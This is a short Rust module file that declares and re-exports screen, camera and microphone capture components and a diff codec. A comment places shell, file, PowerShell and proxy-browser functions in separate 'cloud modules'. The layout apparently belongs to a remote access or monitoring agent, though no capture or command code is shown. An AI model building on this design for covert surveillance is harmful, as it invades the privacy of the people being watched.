//! Execution modules — kernel-resident streaming/media pieces only.
//! shell, files, PowerShell and proxy browser live in cloud modules.

mod screen_capture;
mod camera_capture;
mod mic_capture;
pub mod diff_codec;

pub use screen_capture::{ScreenCapture, ScreenStream, ScreenFrame};
pub use camera_capture::{CameraCapture, CameraStream, CameraFrame};
pub use mic_capture::MicCapture;
